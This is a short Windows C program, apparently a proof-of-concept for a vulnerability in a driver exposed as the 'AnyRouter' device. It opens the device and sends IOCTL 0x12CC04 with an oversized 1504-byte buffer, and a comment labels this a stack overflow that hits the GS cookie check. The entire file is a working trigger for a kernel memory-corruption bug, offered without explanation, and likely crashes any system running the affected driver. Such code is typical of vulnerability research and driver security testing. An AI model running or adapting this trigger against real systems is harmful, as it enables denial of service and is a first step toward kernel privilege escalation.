#include <windows.h>
#include <stdio.h>
HANDLE hDriver;
DWORD dw;
int main() {
	HANDLE hDriver = CreateFileA("\\\\.\\AnyRouter", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return -1;
	}
	char buf[1504]{};
	//Stack overflow gs
	DeviceIoControl(hDriver, 0x12CC04, buf, 1504, 0, 0, &dw, NULL);

	return 0;
}
